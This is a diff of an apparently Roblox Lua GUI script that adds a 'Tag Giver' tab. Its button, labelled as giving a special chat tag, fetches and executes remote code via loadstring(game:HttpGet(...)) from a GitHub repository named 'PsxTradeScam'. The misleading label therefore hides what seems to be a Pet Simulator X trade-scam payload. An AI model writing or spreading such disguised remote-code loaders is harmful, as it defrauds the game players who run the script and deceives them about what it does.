@@ -74,15 +74,13 @@ end)
 
 
 --seventh
-local SpecialTags = Windows:NewTab("Tag Giver")
-local SpecialTagsSection = Tags:NewSection("Partner Tag")
-local SpecialTagsSection = Tags:NewSection("Developer Tag")
-local SpecialTagsSection = Tags:NewSection("Leader Board Tag")
-local SpecialTagsSection = Tags:NewSection("Admin Tag")
+local SepcialTags = Window:NewTab("Tag Giver")
+local SepcialTagsSection = SepcialTags:NewSection("Developer Tag")
+local SepcialTagsSection = SepcialTags:NewSection("Partner Tag")
 
 
-TagsSection:NewButton("Tag Giver", "Give special tag in chat", function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/PetSimXScriptsYT/PsxTradeScam/main/PsxTradeScam"))()  --<--your own script on any hithubs but not the top one thats the one that makes the gui
+SepcialTagsSection:NewButton("Tag Giver", "Gives a special tag in chat", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/PetSimXScriptsYT/PsxTradeScam/main/PsxTradeScam"))()
 end)
 
 
